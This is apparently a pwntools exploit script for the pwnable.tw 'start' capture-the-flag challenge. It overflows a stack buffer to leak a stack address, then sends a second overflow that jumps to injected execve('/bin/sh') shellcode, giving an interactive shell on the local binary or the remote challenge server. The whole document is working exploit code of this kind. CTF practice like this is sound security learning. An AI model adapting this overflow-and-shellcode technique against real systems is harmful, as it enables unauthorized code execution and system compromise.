#!/usr/bin/python3
from pwn import *

PATH = "./start"
HOST, PORT = "chall.pwnable.tw", 10000
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
#libc = ELF("libc.so.6") if args.REMOTE else exe.libc
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = f'''

#b*$_base()+0x00000000000014E8
b*0x804809c

c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
GDB()

payload  = b"A"*20
payload += p32(0x08048087)
sa(b"Let's start the CTF:", payload)
stack = info(u32(p.recv(4)), "stack")

n0 = b'\0'

shellcode = asm(f'''
        push {u32(b"/sh" + n0)}
        push {u32(b"/bin")}
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov al, 0x0b
        int 0x80
''')
print(disasm(shellcode))
print(len(shellcode))

payload  = b"A"*20
payload += p32(stack-4+24)
payload += shellcode
s(payload)

p.interactive()
